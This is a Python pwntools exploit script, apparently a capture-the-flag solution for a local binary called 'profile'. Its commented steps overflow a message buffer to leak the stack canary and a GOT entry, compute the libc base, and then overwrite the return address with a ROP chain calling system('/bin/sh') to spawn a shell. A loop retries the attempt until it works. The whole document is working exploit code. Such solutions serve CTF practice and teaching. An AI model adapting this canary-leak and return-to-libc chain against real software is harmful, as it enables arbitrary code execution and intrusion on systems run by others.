from pwn import *
from time import sleep

libc = ELF("./libc-2.23.so")
getchar_off = libc.symbols['getchar']
system_off = libc.symbols['system']
bin_sh_off = next(libc.search("/bin/sh"))
pop_rdi = 0x401713 
ret = 0x400df1 

def update(r, msg):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("message >> ", msg)
    
def show(r):
    r.sendlineafter(">> ", "2")

def exit(r):
    r.sendlineafter(">> ", "0")
    
def exploit(r):
    # Send a name of length 8, a random age and a message with lenght < 8
    r.sendlineafter("Name >> ", "A"*8)
    r.sendlineafter("Age >> ", "1337")
    r.sendlineafter("Message >> ", "A"*1)
    # Update the message to overwrite the LSB of name and brute force a bit for the canary
    update(r, "A"*16 + "\x58")
    # Show profile to leak canary
    show(r)
    r.recvuntil("Name : ")
    canary = u64(r.recv(8))
    log.info("canary: " + hex(canary))
    # Update the message to overwrite name to point to GOT
    update(r, "A"*16 + p64(0x602070))
    # Show profile to leak GOT
    show(r)
    r.recvuntil("Name : ")
    base_libc = u64(r.recv(8)) - getchar_off
    log.info("base_libc: " + hex(base_libc))
    system = base_libc + system_off
    bin_sh = base_libc + bin_sh_off
    # Update the message again to overwrite ret and return to libc (note that we overwrite name to NULL to prevent the destructor from crashing)
    update(r, "A"*16 + p64(0) + "A"*32 + p64(canary) + "\0"*24 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system))
    # Exit to return
    exit(r)
    r.interactive()

while (True):
    try:
        r = process("./profile", env = {'LD_PRELOAD' : './libc-2.23.so'})
        exploit(r)
    except EOFError:
        r.close()
        sleep(1)


